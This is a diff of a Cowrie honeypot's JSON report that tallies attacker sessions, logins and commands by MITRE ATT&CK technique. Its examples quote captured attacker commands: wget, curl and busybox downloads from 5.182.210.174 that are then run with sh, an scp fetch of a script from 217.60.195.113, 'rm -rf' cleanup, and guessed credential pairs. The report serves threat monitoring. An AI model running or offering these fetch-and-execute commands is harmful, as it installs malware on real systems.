@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-26 04:00:44",
+  "generated": "2026-08-26 05:04:36",
   "totals": {
-    "commands": 54,
-    "login_failed": 916,
-    "login_success": 13,
-    "sessions": 983
+    "commands": 58,
+    "login_failed": 970,
+    "login_success": 17,
+    "sessions": 1084
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 916,
+      "count": 970,
       "examples": [
         "frappe / epparf",
         "ubuntu / Living@123",
@@ -21,14 +21,14 @@
         "blank / user"
       ],
       "first": "2026-08-26T00:03:18.226679Z",
-      "last": "2026-08-26T04:00:43.735085Z",
-      "unique_ips": 43
+      "last": "2026-08-26T05:04:16.011966Z",
+      "unique_ips": 55
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 13,
+      "count": 17,
       "examples": [
         "root / ",
         "ubnt / ubnt999",
@@ -37,32 +37,91 @@
         "root / 123@@@"
       ],
       "first": "2026-08-26T00:16:32.761158Z",
-      "last": "2026-08-26T03:55:45.772827Z",
-      "unique_ips": 13
+      "last": "2026-08-26T05:02:05.596731Z",
+      "unique_ips": 17
     },
     {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 2,
+      "id": "T1105",
+      "name": "Ingress Tool Transfer",
+      "tactic": "Command and Control",
+      "count": 5,
       "examples": [
-        "id"
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
+        "http://5.182.210.174/ok"
       ],
-      "first": "2026-08-26T01:40:56.779330Z",
-      "last": "2026-08-26T02:13:06.243473Z",
-      "unique_ips": 2
+      "first": "2026-08-26T01:40:57.148328Z",
+      "last": "2026-08-26T05:02:06.260828Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 5,
+      "examples": [
+        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-26T01:40:57.148328Z",
+      "last": "2026-08-26T05:02:05.852726Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 2,
+      "count": 4,
       "examples": [
         "uname -s -v -n -r -m",
-        "uname -a"
+        "uname -a",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-26T01:56:58.945871Z",
-      "last": "2026-08-26T02:31:18.259833Z",
+      "last": "2026-08-26T04:07:38.665167Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1033",
+      "name": "System Owner/User Discovery",
+      "tactic": "Discovery",
+      "count": 3,
+      "examples": [
+        "id",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+      ],
+      "first": "2026-08-26T01:40:56.779330Z",
+      "last": "2026-08-26T04:07:38.665167Z",
+      "unique_ips": 3
+    },
+    {
+      "id": "T1059.004",
+      "name": "Command and Scripting Interpreter: Unix Shell",
+      "tactic": "Execution",
+      "count": 3,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-26T04:07:38.665167Z",
+      "last": "2026-08-26T05:02:05.852726Z",
+      "unique_ips": 2
+    },
+    {
+      "id": "T1070.004",
+      "name": "Indicator Removal: File Deletion",
+      "tactic": "Defense Evasion",
+      "count": 2,
+      "examples": [
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/"
+      ],
+      "first": "2026-08-26T04:07:38.665167Z",
+      "last": "2026-08-26T05:02:05.852726Z",
       "unique_ips": 2
     },
     {
@@ -75,30 +134,6 @@
       ],
       "first": "2026-08-26T01:40:56.784235Z",
       "last": "2026-08-26T02:13:06.248338Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 2,
-      "examples": [
-        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $"
-      ],
-      "first": "2026-08-26T01:40:57.148328Z",
-      "last": "2026-08-26T02:13:06.583364Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 2,
-      "examples": [
-        "UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -F sshcfg -i key.ppk dlr@217.60.195.113:sh out_sh; if [ $"
-      ],
-      "first": "2026-08-26T01:40:57.148328Z",
-      "last": "2026-08-26T02:13:06.583364Z",
       "unique_ips": 2
     }
   ],
@@ -174,6 +209,10 @@
     [
       "cd /proc && cat self/cmdline",
       2
+    ],
+    [
+      "exit",
+      1
     ]
   ]
 }
